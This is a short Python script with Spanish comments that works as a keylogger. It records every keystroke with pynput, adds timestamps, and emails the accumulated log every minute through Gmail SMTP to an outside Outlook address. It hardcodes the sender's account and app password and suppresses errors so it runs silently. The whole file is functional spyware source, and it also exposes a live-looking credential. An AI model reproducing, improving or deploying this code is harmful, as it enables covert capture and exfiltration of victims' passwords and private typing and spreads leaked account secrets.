import threading
import smtplib
from datetime import datetime
from pynput import keyboard
from email.message import EmailMessage

# Datos del correo (usa tu cuenta y clave de app)
remitente = "pabloescada3@gmail.com"
destinatario = "mago.personal@outlook.com"
clave_app = "aasu olet lmpx iayp"  # <- ya sin espacios

current_log = []
lock = threading.Lock()

# Enviar log por correo
def enviar_email(mensaje):
    try:
        email = EmailMessage()
        email["From"] = remitente
        email["To"] = destinatario
        email["Subject"] = "Log de teclado - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        email.set_content(mensaje)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(remitente, clave_app)
            smtp.send_message(email)
    except Exception as e:
        pass  # Silenciar errores en ejecución

# Acumular y enviar cada minuto
def save_log():
    global current_log
    with lock:
        if current_log:
            contenido = "\n".join(current_log)
            enviar_email(contenido)
            current_log = []
    threading.Timer(60, save_log).start()

# Captura de teclas
def on_press(key):
    global current_log
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with lock:
        try:
            current_log.append(f"{timestamp} Tecla: '{key.char}'")
        except AttributeError:
            special_key = str(key).replace('Key.', '').upper()
            current_log.append(f"{timestamp} Tecla especial: [{special_key}]")

# Inicio del proceso
save_log()

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception:
    pass
